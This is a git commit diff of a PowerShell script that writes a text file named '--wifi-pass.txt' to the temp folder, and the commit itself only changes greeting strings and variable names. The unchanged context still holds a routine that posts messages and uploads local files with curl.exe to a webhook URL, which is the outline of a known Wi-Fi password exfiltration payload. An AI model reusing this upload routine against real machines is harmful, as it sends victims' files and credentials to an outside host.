b1ad2de16cab77c8ac99a6a63e819d8e1e13ad4d
Towa <70810089+Towux@users.noreply.github.com>
2023-05-31 19:54:28 +0300

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,6 +1,6 @@
 ############################################################################################################################################################
 
-$wifiProfiles = "Привет, $env:username"
+$wifiProfiles = "Привет 123, $env:username"
 
 
 $wifiProfiles > $env:TEMP/--wifi-pass.txt
@@ -19,13 +19,13 @@ param (
 
 $hookurl = "$dc"
 
-$Body = @{
-  'username' = 'Хуууй'
-  'content' = 'Чо'
+$body = @{
+    'content'  = 'Ваше сообщение здесь'
+    'username' = 'Сергей'
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($body | ConvertTo-Json)};
 
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
